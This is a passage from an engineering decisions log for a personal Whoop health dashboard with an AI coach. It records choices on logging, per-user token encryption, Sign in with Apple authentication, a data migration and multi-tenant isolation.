chosen as a shipped surface (table + dashboard) over zero-code DevTools/react-scan or a dev-only HUD, per the user's pick.

**Status:** active (shipped to prod 2026-06-21)

**References:** PRs #417 (features), #418 (provider-agnostic heartbeat fix), #419 (title fallback); `apps/web/src/app/api/chat/route.ts` (watchdog + on-stream title), `apps/web/src/lib/coach/title.ts`, `apps/web/src/components/coach/useThreadList.ts`, `apps/web/src/lib/db/perf.ts` + `apps/web/src/app/api/perf/route.ts` + `apps/web/src/components/WebVitalsReporter.tsx` + `apps/web/src/app/(dashboard)/perf/`; supersedes the PR #249 SSE keepalive revert; see also the Cursor Composer provider decision (`cursor-loop.ts`).

---

## 2026-05-16: Logs view rebuild — Murmur-style unified timeline + structured logger + client/iOS capture

**Decision:** Build a unified `/logs` page that shows every event the system or user produces (server, web, ios, sync, coach, route, webhook) in one filterable, searchable, expandable timeline. Five burn-pipeline lanes: (L1) schema + pino + `server_logs`/`client_logs` tables + `/api/log/client` endpoint; (L2) web client capture via `window.onerror`/`unhandledrejection`/ErrorBoundary/pageview/`data-track` clicks on 6 elements; (L3) iOS `ClientLogger` for errors + lifecycle (no click capture); (L4) unified UI rewrite with source chips, level filter, search, time range, live-tail toggle, row expand; (L5) coach `chat_messages.blocks` chain inspector inside the row expand. L1 blocks all; L2+L3 parallel after L1; L4 after L1; L5 after L4. Subsumes issues #286 (coach CLI) and #305 (structured logging foundation tiers 1–3). Tier 4 (Sentry/PostHog) deferred. Decisions taken on user's behalf are enumerated in `docs/logs-view-scope.md` §"Decisions taken on user's behalf".

**Rationale:** User asked for a `/logs` page that matches Murmur's polish but on the VM, with "everything I sent, tracked, clicked" visible and grouped beautifully. Current state: four event tables already exist (`sync_logs`, `chat_logs`, `route_logs`, `webhook_events`) but 38 raw `console.*` calls scatter to journald, zero browser/iOS error capture, zero pageview/click instrumentation, and the existing `/logs` page is three separate sections rather than a unified timeline. Five-lane split chosen over one mega-PR because (a) L1 is a pure backend foundation that gates everything else, (b) L2 and L3 are mechanically independent (web vs iOS file trees), (c) L4 is the visible UX win that benefits from L2+L3 data, (d) L5 closes out the coach-CLI ask (issue #286, earlier-discussed as best served by UI extension) cleanly after the timeline lands. Storage choice: `server_logs` table (warn+) + journald-all rather than ring buffer (dies on Next.js process restart) or pure files (splits query path); volume is tiny (personal-use) and SQL keeps one query surface. Search via `LIKE` over FTS5 for the same volume reason. Live tail via 3s SWR polling over SSE/WS to avoid infra for personal-use scale. Click capture explicit via `data-track` on 6 elements over auto-capture to avoid PII risk and noise. iOS click capture deferred — errors + lifecycle covers 90% of debug value and SwiftUI click hooks are heavy.

**Status:** active

**References:** `docs/logs-view-scope.md` (goal + lane breakdown + decisions table), issue #305 (structured logging — tiers 1–3 subsumed, tier 4 deferred), issue #286 (coach CLI — subsumed by Lane 5 block inspector), Murmur log viewer at `/Users/george-mac-mini/Documents/code/murmur-app/app/src/components/log-viewer/` (inspiration), existing surface at `apps/web/src/app/(dashboard)/logs/page.tsx` + `apps/web/src/lib/db/logs.ts` + `apps/web/src/lib/db/connection.ts` (schema home)

---

## 2026-05-13: Phase A (per-user token encryption) closed retroactively — issue #317 was an orphan tracker

**Decision:** Close issue #317 ("Phase A — per-user token storage + libsodium") as completed-by-prior-work. All acceptance criteria already satisfied on `main`: `integrations` table (`apps/web/src/lib/db/connection.ts:191`), `user_settings` table (`connection.ts:212`), encryption module (`apps/web/src/lib/crypto/vault.ts` — `encrypt`/`decrypt`/`assertVaultKeyConfigured`/`assertKeyVersionSupported`), DB helpers (`db/integrations.ts`, `db/user_settings.ts`), VAULT_KEY entry in `.env.example` with generation comment, vitest coverage in `integrations.test.ts` + `user_settings.test.ts`. No code change in this PR — receipt-only DECISIONS entry to tie off the open ticket.

**Rationale:** Phase A landed silently in PR #65 (pre-tracker), then evolved in-place through Phase C (issue #320, added `provider_user_id` + `setIntegrationNeedsReauth`), Phase D (issue #323, added `lookupUserIdByProvider` for webhook routing), and Phase E.2 (issue #334, BYOK Anthropic key wired into `user_settings.anthropic_key`). The original Phase A issue text was filed against an outdated snapshot and never updated to reflect what actually shipped. Two divergences from the spec are intentional and stay: (1) the encryption lib is `tweetnacl` (pure JS NaCl secretbox) rather than `libsodium-wrappers` — same algorithm (XSalsa20-Poly1305), no async init, wire-format-compatible with `streamlit/whoop/vault.py`; (2) ciphertext columns are TEXT (base64) rather than BLOB so the Python/Node round-trip is trivial and `key_version` rotation tooling can read rows without binary handling.

**Status:** active

**References:** issue #317 (closed by this PR), PR #65 (original Phase A), `apps/web/src/lib/crypto/vault.ts`, `apps/web/src/lib/db/integrations.ts`, `apps/web/src/lib/db/user_settings.ts`. The 2026-05-09 Phase C kickoff entry below already noted "the Phase A surprise where `integrations` table + core vault had already shipped".

---

## 2026-05-12: Removed Coach "Use API mode" toggle — BYOK + env precedence is now the single source of truth

**Decision:** Phase E.2 (issue #334, BYOK Anthropic key) dropped the `use_api_mode` setting + `api_key_present` field from `/api/settings` and removed the Coach toggle card from `/settings`. The Coach now always uses Anthropic via the SDK; the only knob is which key it uses, resolved per request: `user_settings.anthropic_key` (BYOK) wins, `process.env.ANTHROPIC_API_KEY` falls back, neither returns 503 with a Settings pointer.

**Rationale:** The toggle dated to the pre-Phase-D era when there was a CLI fallback path. Phase D retired Streamlit + the CLI; the Anthropic SDK is the only code path. Keeping a "Use API mode" switch that has no off-state was confusing and let a stale `setting('use_api_mode', '0')` row sit in the DB doing nothing. BYOK + env precedence makes the user-vs-operator key distinction the only setting that matters.

**Status:** active

**References:** issue #334, PR for `feat/334-byok-anthropic-key`, `apps/web/src/lib/coach/api-key.ts` (resolver), `apps/web/src/app/api/me/anthropic-key/route.ts`

---

## 2026-05-12: Phase B-cleanup landed — CF Access dropped on coach.georgenijo.com, SIWA is sole web gate

**Decision:** PR #332 merged + deployed 2026-05-12. `requireAuth` collapsed to Bearer → Cookie → 401. Deleted: `getBootstrapUser`, `getPrimaryUser`, `findOrCreateUserByEmail`, `lib/auth/cf-access.ts`. Admin gate on `webhook/replay/route.ts` switched from `user.id !== 1` to `ADMIN_APPLE_SUB` env match (fail-closed). New `requireAuthOrSignin` helper used by all `(dashboard)` page handlers — redirects to `/signin` instead of throwing 500 when the proxy gate misses. Four CF Access apps deleted via API in order (parent FIRST, then 3 path-bypass apps): `Coach Dashboard` (839d958e...), webhook bypass (1ca713c6...), ACME bypass (9b6b82f4...), SIWA callback bypass (e42ef1da...). Post-drop smoke green: `/` → 307 /signin, `/api/whoop/webhook` GET → 405, `/api/threads` fake bearer → 401 JSON. Cert renewal unaffected — certbot uses `--nginx` authenticator which short-circuits at the nginx layer before reaching Next.js.

**Rationale:** Phase D + uid1→uid2 migration unblocked B-cleanup. Double-gate (CF Access + SIWA proxy) was costly: CF Access only allowed a single email so blocked legitimate multi-tenant flow, and the dev-mode bootstrap fallback in `requireAuth` was a code smell (a misconfigured deploy with `NODE_ENV` unset would silently auth as user_id=1). Single gate via SIWA + JWT cookie matches the scalable architecture doc Phase B. `ADMIN_APPLE_SUB` env over `ADMIN_USER_ID` because `apple_sub` is durable across user-id renumbers and smaller blast radius if VM env gets typo'd.

**Status:** active

**References:** PR #332, issue #327, `docs/architecture-scalable.html` (Phase B), memory `cloudflare_setup` (4 deleted apps), follow-up issues #328 (`/signup` wizard), #329 (Google SIWA), #330 (`saveTokens` uid=1 cleanup), #331 (rate-limit audit), `docs/decisions/2026-05-08-api-stack.md` (marked superseded by this entry)

---

## 2026-05-11: Migrate uid=1 → uid=2 domain data (post-Phase-D fallout)

**Decision:** Executed one-shot migration `apps/web/scripts/migrate-uid1-to-uid2.ts` against prod. For each composite-PK table (`recovery`, `sleep`, `cycles`, `daily_summary`): DELETE uid=1 rows whose `date` already exists on uid=2 (uid=2 wins — post-reconnect data is fresher) + UPDATE remaining uid=1 rows → uid=2. For `workouts` (PK=`id`): straight UPDATE (no overlap possible). Final pass: `recomputeDailySummary` for every uid=2 date with recovery/sleep/cycles but no summary row. Moved 482 domain rows (recovery 145, sleep 148, cycles 150, daily_summary 12, workouts 37) + recomputed 138 daily_summary rows. Pre-deploy backup at `~/whoop_data.db.backup.20260511-194420` (1.56 MB).

**Rationale:** Phase D's `ALTER TABLE ... ADD COLUMN user_id INTEGER NOT NULL DEFAULT 1` correctly assigned all pre-Phase-D rows to uid=1, but uid=1 hasn't been the active user since the 2026-05-09 SIWA cutover ([[cross_device_user_split]]) — George's web + iOS sessions both resolve to uid=2. The "cross-device split RESOLVED" memory marked the auth side complete but the data was never migrated; Phase D made the split user-visible ("only last week's data" reports). Migration is the actual completion of the cross-device unification. uid=1 retained in `users` table as bootstrap placeholder until Phase B-cleanup removes the `getPrimaryUser()` id=1 hardcoding at `apps/web/src/lib/db/auth.ts:59`.

**Status:** active

**References:** `apps/web/scripts/migrate-uid1-to-uid2.ts`, memory `cross_device_user_split.md`, PR #324 (Phase D), `apps/web/src/lib/db/auth.ts:59`

---

## 2026-05-11: Phase D kickoff — PK rebuild for 4 domain tables, no operational fence, 6-step execution

**Decision:** Phase D (issue #323) scopes to: (1) add `user_id` to `recovery`, `cycles`, `sleep`, `workouts`, `daily_summary` — for `recovery`/`cycles`/`sleep`/`daily_summary` the new PK is composite `(user_id, date)`, requiring a `CREATE TABLE _new` + `INSERT SELECT 1, ...` + `DROP` + `RENAME` rebuild gated by a `PRAGMA table_info` "no user_id col" check; `workouts` stays simple ALTER (PK = `id`). (2) Build `apps/web/src/lib/db/scoped.ts` `forUser(userId)` wrapper — params-only binding, no SQL parsing, call-site writes `... AND user_id = ?` as the **last** placeholder. (3) Thread `userId` through all `upsert*`, `delete*AndRecompute`, `recomputeDailySummary` and call sites. (4) Migrate every domain `safeQuery` in `lib/db/{recovery,sleep,strain,workouts,summary,prs,body}.ts` + coach `query_*` branches + dashboard page handlers. (5) CI assertion = vitest test that greps for `FROM|JOIN|INTO|UPDATE|DELETE FROM (recovery|cycles|sleep|workouts|daily_summary|body_measurements)` outside an allowlist (`scoped.ts`, `connection.ts`, `upsert.ts`, `sync.ts`). (6) Webhook user mapping via new `integrations.provider_user_id` column (see separate decision below). Scope item #8 (lift operational fence) **dropped** — pre-impl review found no fence exists; webhook hardcoded `userId = 1` at `webhook-handler.ts:40` is the only approximation and item #7 already replaces it.

**Rationale:** Architect + Plan agents converged on this shape. PK rebuild is unavoidable for multi-tenant correctness: keeping `date PRIMARY KEY` would let user 2's `2026-05-11` row collide with user 1's via `INSERT … ON CONFLICT(date) UPDATE`, overwriting silently. Few-thousand-row tables make the rebuild sub-second. Params-only wrapper avoids SQL-parser fragility (CTEs, UNIONs, JOINs) — call-site discipline plus the CI assertion is the safety net. `body_measurements` already shipped this shape (PR #283) and stays unchanged structurally, but folds into the wrapper for read consistency. Coach tools already plumb `userId` into `executeTool({ userId })` (PR #322) — only the five `query_*` branches at `tools.ts:358-384` need to pass it into the read fns.

**Status:** active

**References:** issue #323, Plan agent + whoop-architect outputs (Phase D pre-impl), PRs #318/#322, `docs/architecture-scalable.html` (Phase D section)

---

## 2026-05-11: Phase D — `provider_user_id` captured in OAuth callback + lazy backfilled on sync

**Decision:** Add `provider_user_id TEXT` column + `idx_integrations_provider_user(provider, provider_user_id)` to `integrations`. Capture path: (a) primary — in `/api/auth/callback/route.ts` right after `exchangeCode()` succeeds, call `getWhoopProfile({ userId })` against `/v2/user/profile/basic` (not `/v1` — issue text was wrong; Python client at `streamlit/whoop/client.py:57` confirms `/v2`) and `setProviderUserId(userId, "whoop", String(profile.user_id))`. Wrap in try/catch — log + continue on failure, **do not fail the OAuth flow**. (b) lazy backfill — every `runWhoopSync({ userId })` checks if the integration row's `provider_user_id IS NULL` and, if so, fetches the profile and populates. (c) one-shot — `scripts/backfill-whoop-provider-user-id.ts` for the maintainer's existing row pre-deploy. Webhook handler at `webhook-handler.ts:36-40` replaces the hardcoded `userId = 1` with `lookupUserIdByProvider("whoop", String(evt.user_id))`; on miss returns `{ kind: "noop", reason: "unknown_whoop_user" }` (200 status — Whoop won't retry).

**Rationale:** Belt-and-suspenders. Callback fetch makes the mapping live the instant a user connects — webhook events for that user route correctly from t=0. Lazy backfill is the resilience layer: a callback that succeeded the OAuth exchange but tripped on the profile call (network blip, Whoop 5xx) gets repaired automatically on the user's next sync without manual intervention. Either alone would leave a gap (callback-only: stuck until manual fix; lazy-only: every webhook between connect-and-first-sync is a `noop`, which is recoverable via Whoop's 5× retry but ugly). Token-exchange response does NOT include the Whoop user_id (confirmed against `apps/web/src/lib/auth.ts:89-95` and the Python client) so a separate API call is required either way.

**Status:** active

**References:** issue #323, `apps/web/src/lib/whoop/client.ts`, `apps/web/src/app/api/auth/callback/route.ts`, `apps/web/src/lib/db/integrations.ts`, `streamlit/whoop/client.py`

---

## 2026-05-11: Phase C-minimum further reduced — existing dual-write infrastructure means smaller delta than scoped

**Decision:** Pre-implementation review of issue #320 found four pieces already shipped beyond the Phase A snapshot: `getValidAccessToken()` reads from `integrations` first, `saveTokens()` dual-writes to `integrations` + `tokens.json`, `/api/connectors/whoop` returns status, `/api/auth/whoop/disconnect` deletes the row. The remaining Phase C-minimum work is: (1) parameterize `DEFAULT_USER_ID` through the token/sync stack, (2) add HMAC state to the existing `/api/auth/callback` so user_id survives the redirect, (3) add `WHOOP_STATE_SECRET` env with fail-closed loader. **No new `/api/whoop/*` routes** — extend existing surface.

**Rationale:** Architecture review found the original issue text would have introduced parallel `/api/whoop/auth/*` routes alongside the working `/api/auth/callback` route — a "loaded gun" leaving a stale unsigned-state route in production. Pattern-matches the Phase A surprise where `integrations` table + core vault had already shipped in PR #65. Better to extend than parallel-implement.

**Status:** active

**References:** issue #320 (rescoped), architect review (a86487a00b7424563), `apps/web/src/lib/whoop/token.ts`, `apps/web/src/lib/auth.ts`, PR #318

---

## 2026-05-11: Phase C un-bundled — minimum scope = 3 items, Phase D moves out

**Decision:** Phase C ships in two cuts. **Phase C-minimum** (~2 days) is the OAuth-only slice: `/api/whoop/auth/start`, `/api/whoop/auth/callback`, refactor `runWhoopSync(userId)` to read tokens from the `integrations` table, one-shot migration of `tokens.json` → `integrations` row, Settings UI Connect/Disconnect. **Phase D** (~2–3 days, separate issue) adds `user_id` columns to `recovery` / `cycles` / `sleep` / `workouts` / `daily_summary`, the `forUser()` wrapper, and backfill to `user_id=1`.

**Rationale:** The earlier scope bundled the per-user-OAuth work (genuinely required) with the per-user-data work (separately useful but not required for OAuth to function). Un-bundling lets us ship the Whoop Connect/Disconnect UX, retire `tokens.json`, and land the encrypted token storage as one coherent feature without dragging schema migration of five domain tables behind it. Caveat: after Phase C-minimum but before Phase D, two users syncing simultaneously would still collide at the row level (no `user_id` on domain tables). Acceptable because the only active syncing user today is the maintainer; Phase D follows immediately.

**Status:** active

**Supersedes:** the earlier 2026-05-11 entry below

**References:** `docs/architecture-scalable.html` Phase C, Phase D

---

## 2026-05-11: Phase C scope locked — shared Whoop app, web-only OAuth, one-shot migration

**Decision:** Phase C (per-user Whoop OAuth) will use one shared Whoop developer app for all users, route OAuth through the web app only (not native iOS), migrate `tokens.json` to an `integrations` row via a one-shot script, and backfill all existing recovery/cycles/sleep/workouts/daily_summary rows to `user_id=1` (legacy single-user). `user_id=2` (SIWA path) starts fresh.

**Rationale:** Shared dev app matches the scalable architecture doc's "shared client_id rate budget (hosted)" path and sidesteps per-user Whoop app registration friction. Web-only OAuth keeps the flow simple — iOS users do the one-time Whoop connect via the web app, then iOS reads synced data. Native iOS OAuth via `ASWebAuthenticationSession` is a future option, not worth the cost for a one-time flow. Backfilling to `user_id=1` honors the existing memory note that pre-cutover data stays with the legacy user.

**Status:** superseded by 2026-05-11 (un-bundled into Phase C-minimum + Phase D)

**References:** `docs/architecture-scalable.html` (Phase C section), memory `cross_device_user_split.md`

---

## 2026-05-11: Phase B cleanup gated on Phase C + D

**Decision:** Defer Phase B cleanup items (drop CF Access on public domain, kill `getBootstrapUser()` fallback in `requireAuth()`, build `/signup` screen) until Phase C and Phase D land first.

**Rationale:** Dropping CF Access today exposes the public URL while the bootstrap fallback still resolves to `user_id=1` — anyone hitting `/` would see the maintainer's data. Killing the bootstrap fallback today breaks the SIWA path because sync data is still keyed to `user_id=1` while logged-in users are `user_id=2`. Both items are only safe once per-user Whoop OAuth + data isolation are in place.

**Status:** active

**References:** `docs/architecture-scalable.html` Phase B, memory `cross_device_user_split.md`

---

## 2026-05-11: Phase ordering — A → C → D → B-cleanup → E → F (not alphabetical)

**Decision:** Execute the scalable architecture phases in dependency order, not alphabetical order. Phase A (foundation tables + encryption) first, then Phase C (per-user Whoop OAuth), then Phase D (data isolation audit), then Phase B cleanup (drop CF Access, kill bootstrap, `/signup`), then Phase E (onboarding UX), then Phase F (packaging, optional).

**Rationale:** The scalable doc lists phases alphabetically but the real dependency graph isn't. Phase A is the foundation everything else writes to. Phase C needs A's `integrations` table. Phase D needs C's `user_id`-stamped data to wrap. Phase B cleanup needs all of the above to be safe to ship. Phase E is UX on top of working multi-tenant plumbing. Phase F is packaging the result.

**Status:** active

**References:** `docs/architecture-scalable.html`, `memory/project_direction.md`

---

## 2026-05-11: Project direction — scalable BYOK multi-tenant (supersedes life-intelligence framing)

**Decision:** The project direction is the scalable, BYOK (bring-your-own-key), multi-tenant architecture documented in `docs/architecture-scalable.html`. Future users sign in with Apple, connect their own Whoop OAuth, drop in their own Anthropic key, and have a working dashboard.

**Rationale:** The previous "life intelligence platform / magic-feature (stress-after-meeting)" framing — captured in `memory/project_direction.md` pre-2026-05-11 — was building features on top of a single-tenant base that can't be shared. Useful work was completed under that framing (iOS scaffold, Coach tool-use, APNs foundation) but it was the wrong organizing principle. The product should be portable, not tied to one Whoop account, one Anthropic key, one CF Access allowlist entry.

**Status:** active

**References:** `docs/architecture-scalable.html`, `docs/architecture-current.html`, `memory/project_direction.md` (rewritten 2026-05-11)

---

## 2026-05-11: Rebuild docs (`docs/rebuild/PLAN.md`, `GUIDE.md`) marked stale

**Decision:** Treat `docs/rebuild/PLAN.md` and `docs/rebuild/GUIDE.md` as historical artifacts. They describe the Streamlit → Next.js rebuild, which shipped. They do not describe current direction.

**Rationale:** GUIDE.md last updated 2026-04-23 and says "Phase 1 active" but Phases 1–4 of the rebuild all shipped: Next.js live, Coach with tool-use, mobile nav, Streamlit relegated to legacy. Reading them as current guidance produces wrong answers about where the project is. The current direction lives in `docs/architecture-scalable.html` (target) and `docs/architecture-current.html` (snapshot).

**Status:** active

**References:** `docs/rebuild/PLAN.md`, `docs/rebuild/GUIDE.md`, `docs/architecture-scalable.html`

---

## 2026-05-11: Encryption strategy — tweetnacl + single `VAULT_KEY` env (sealed-box symmetric)

**Decision:** Use the existing `tweetnacl` library for token/secret encryption with a single `VAULT_KEY` environment variable (32 bytes base64). Rotation strategy: re-encrypt all rows under a new key. Issue #319 tracks setting `VAULT_KEY` on the VM before Phase C deploys.

**Rationale:** `tweetnacl` was already in `apps/web/package.json` from PR #65 and shares on-disk wire format with `streamlit/whoop/vault.py` (PyNaCl, both libsodium-derived). Switching to `libsodium-wrappers` for parity with the scalable doc would have required parity-rechecking the Python side for no functional benefit — both libraries are byte-compatible. Per-user derived keys and SQLCipher whole-DB encryption (the other two options in the scalable doc's open decisions) add complexity for an isolation guarantee that doesn't apply at current scale.

**Status:** active

**References:** PR #318, PR #65, `apps/web/src/lib/crypto/vault.ts`, `docs/architecture-scalable.html` (open decisions §3), issue #319

---

## 2026-05-11: Add `anthropic_key_version` column to `user_settings`

**Decision:** `user_settings` table includes an `anthropic_key_version INTEGER` column alongside the encrypted `anthropic_key` BLOB. Mirrors the existing `integrations.key_version` column on the sibling table.

**Rationale:** Without a version column, the decrypt path can't distinguish "rotated key, re-encrypt needed" from "corrupted ciphertext / wrong key" — both manifest as a Poly1305 MAC failure. Phase E's rotation tooling will walk both `integrations` and `user_settings`; keeping the two encryption-bearing tables structurally symmetric simplifies that future walk. The cost is one nullable INTEGER column on a single-row-per-user table — effectively free.

**Status:** active

**References:** PR #318, `apps/web/src/lib/db/user_settings.ts`, `apps/web/src/lib/db/integrations.ts`

---

## 2026-05-11: Issue #316 Coach-disconnect fix — Option A (persist partial on abort)

**Decision:** For the bug where Coach prompts disappear when the client disconnects mid-turn (iOS app backgrounding, web refresh), implement the partial-persist fix: on `abort`, commit whatever blocks the loop has accumulated with a `status='aborted'` marker. The turn does not continue in the background after disconnect.

**Rationale:** Matches consumer-LLM chat parity (claude.ai, ChatGPT default chat). Option B (detached turn worker that survives disconnect and is resumable on app reopen) is the right long-term answer but needs a turn-state table, worker lifecycle, reconnect protocol, and orphan GC — moderate scope. Option A is ~1 day, addresses the worst symptom (prompt vanishing entirely), and doesn't preclude shipping Option B later. For a personal-use dashboard, parity with claude.ai is the honest bar.

**Status:** active

**References:** issue #316, `apps/web/src/app/api/chat/route.ts`

---

## 2026-05-11: Defer #274b (Whoop-disconnect push); retain #274c (iOS reconnect button)

**Decision:** Mark issue #274b (`needs_reauth` 0→1 detection + "Whoop disconnected" push notification) as deferred — fold into the Pillar E rules engine pattern when issue 4-D (stress-after-meeting) lands. Keep issue #274c (iOS Settings tab reconnect button) on the immediate slate as a small UX gap fix.

**Rationale:** #274b is one instance of the "system notices X → send push" pattern; building it now in isolation means throwaway one-off code when the rules engine forces a uniform pattern later. #274c is independent — without a reconnect button, iOS users have no path to re-auth Whoop from the app, which is a real gap unrelated to push infrastructure. Note: this decision predates the project-direction shift to scalable BYOK. With the shift, both items move to the post-Phase-D iOS surface polish queue; revisit when iOS surface work resumes.

**Status:** deferred

**References:** issue #274b, issue #274c, PR #283 (APNs foundation), `memory/project_direction.md`

---
